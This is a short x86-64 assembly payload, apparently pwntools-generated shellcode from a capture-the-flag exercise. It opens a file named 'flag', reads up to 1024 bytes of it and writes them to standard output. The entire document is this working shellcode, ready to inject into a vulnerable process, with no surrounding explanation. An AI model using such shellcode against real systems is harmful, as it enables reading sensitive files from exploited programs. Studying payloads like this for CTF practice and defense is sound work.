/* open(file='flag', oflag=0, mode=0) */
/* push b'flag\x00' */
push 0x67616c66
mov rdi, rsp
xor edx, edx /* 0 */
xor esi, esi /* 0 */
/* call open() */
push SYS_open /* 2 */
pop rax
syscall
/* call read('rax', 'rsp', 0x400) */
mov rdi, rax
xor eax, eax /* SYS_read */
xor edx, edx
mov dh, 0x400 >> 8
mov rsi, rsp
syscall
/* write(fd=1, buf='rsp', n='rax') */
push 1
pop rdi
mov rdx, rax
mov rsi, rsp
/* call write() */
push SYS_write /* 1 */
pop rax
syscall